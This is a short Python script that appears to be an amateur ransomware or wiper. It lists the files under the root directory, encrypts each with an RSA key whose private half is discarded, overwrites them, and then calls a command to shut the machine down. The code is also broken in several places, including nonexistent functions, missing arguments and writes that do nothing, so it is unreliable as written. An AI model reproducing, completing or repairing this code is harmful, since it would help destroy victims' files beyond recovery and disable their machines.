import os
from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes

os.system('cd ../../../../')
def make_rsa():
    p, q = getPrime(2048), getPrime(2048)
    n = p * q
    e = 65537
    return n, e

def encrypt(path, n, e):
    with open(path, 'rb') as for_enc:
        enc = pow(bytes_to_long(for_enc), e, n)
    with open(path, 'wb') as file:
        file = enc
    return True


def get_dirs():
    list_dirs = []
    dirs = os.listdir('/')
    for i in dirs:
        if os.isfile(i):
            encrypt(i)
        else:
            list_dirs.append(i)
    return list_dirs

def encrypt_dir(path, n, e):
    files = os.listdir(path)
    for file in files:
        if os.isfile(file):
            if encrypt(file, n, e) == True:
                print('in progress...')
            else:
                print(f'file {file} wasnt encrypted')
    return
def go_dirs(list_dirs, n, e):
    for dir in list_dirs:
        os.system(f'cd {dir}')
        encrypt_dir(dir, n, e)
    return 'sucsesfully encrypted'

def OH_FCK_LETS_DO_IT(user_os):
    n, e = make_rsa()
    list_of_dirs = get_dirs()
    print(go_dirs(list_of_dirs, n, e))
    do_command(type='off', user_os=user_os)